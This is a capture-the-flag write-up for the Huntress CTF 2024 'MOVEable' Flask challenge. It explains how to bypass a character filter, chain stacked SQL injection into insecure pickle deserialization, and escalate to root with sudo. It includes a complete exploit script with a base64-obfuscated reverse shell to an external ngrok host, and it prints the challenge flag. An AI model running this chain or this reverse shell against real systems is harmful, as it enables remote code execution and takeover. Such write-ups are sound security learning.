# MOVEable

![image](https://github.com/user-attachments/assets/ce4e478b-57f1-4eed-b612-2d9d3041c9b3)

Download: [app.zip](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/app.zip)

## My Solution

For this web challenge, we just have a login screen:  

![image](https://github.com/user-attachments/assets/d45669b2-9c38-4e8b-bc3c-e9abf5925bfb)

There is some sanitization in the form of the `DBClean` function.

```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```

However, we can easily bypass this by using `/**/` instead of space and the single quote can be bypassed by escaping it with a backslash.

The `login` function uses [executescript](https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.executescript) for the login where we have SQL injection instead of using just "execute". This allows us to execute multiple SQL statements.

```python
@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    c.executescript(sql)
    user = c.fetchone()
    print(user)
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
        
        session['username'] = username
        session['session_id'] = session_id
        conn.commit()
        return redirect(url_for('files'))
    else:
        flash('Username or password is incorrect')
        return redirect(url_for('home'))
```

The upload endpoint is nerfed:  

```python
@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    flash('Sorry, the administrator has temporarily disabled file upload capability.')
    return redirect(url_for('files'))
```

But we don't need it because the `download` endpoint doesn't require authentication and it pickle loads the filedata which we could insert into using the SQL injection. We also need to insert an active session for the code to follow the correct logic.

```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    try:    
        return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
    except TypeError:
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```

With the script below we create the pickle data that would execute our payload when it gets loaded and give us a reverse shell.

```python
import base64
import pickle
import os
import requests

class serial():
    def __reduce__(self):               
        return os.system, ('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5ldS5uZ3Jvay5pby8xNTA2NSAwPiYx|base64 -d|bash',)

code = pickle.dumps(serial())
code = base64.b64encode(code)
revshell = code.decode()

url = 'http://challenge.ctf.games:32766/login'
header = {'Content-Type':'application/x-www-form-urlencoded'}
data = '''username=s&password=\\';INSERT/**/INTO/**/activesessions/**/VALUES(\\'lazytitan\\',\\'lazytitan\\',\\'time\\');INSERT/**/INTO/**/files/**/VALUES(\\'payload\\',\\'%s\\',NULL);--";''' % revshell
requests.post(url, data=data, headers=header)

url2 = 'http://challenge.ctf.games:32766/download/payload/lazytitan'
requests.get(url2)
```

Once we have a foothold, we check our sudo permissions and see we can execute all commands as root without requiring authentication so we sudo bash to root and get the flag:  

![image](https://github.com/user-attachments/assets/16defa32-0711-41bd-94d6-167e42be516e)

`flag{ac53cd7aa8a2d1b2340a6eb4a356709e}`
